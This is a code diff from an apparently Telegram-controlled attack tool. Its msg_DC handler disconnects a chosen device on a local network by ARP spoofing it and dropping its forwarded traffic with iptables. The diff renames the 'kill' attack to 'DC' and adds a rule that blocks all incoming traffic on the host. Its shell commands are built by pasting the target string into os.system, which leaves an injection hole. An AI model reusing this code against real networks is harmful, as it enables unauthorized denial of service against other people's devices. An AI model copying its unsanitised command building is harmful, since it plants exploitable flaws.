@@ -164,9 +164,11 @@ def iptables(action, target=False):
 
 
 
-    if action == "kill":
+    if action == "DC":
 
         print("[+] Dropping connections from " + target + " with iptables...")
+
+        os.system("sudo iptables -A INPUT -j DROP")
 
         os.system("sudo iptables -I FORWARD 1 -s " + target + " -j DROP")
 
@@ -1041,11 +1043,11 @@ def msg_DC(update: Update, context: CallbackContext)-> None:
 
         target = [target_ip, target_mac]
 
-        iptables("kill", target=target[0])
+        iptables("DC", target=target[0])
 
         if not attackManager("isattacked", target=target_ip):
 
-            ID = attackManager("new", attack_type="kill", target=target_ip)
+            ID = attackManager("new", attack_type="DC", target=target_ip)
 
             kill_thread = threading.Thread(target=arpSpoof, args=[target])
 
@@ -1055,7 +1057,7 @@ def msg_DC(update: Update, context: CallbackContext)-> None:
 
         else:
 
-            ID = attackManager("new", attack_type="kill", target=target_ip)
+            ID = attackManager("new", attack_type="DC", target=target_ip)
 
 
         user_target =  os.getlogin()
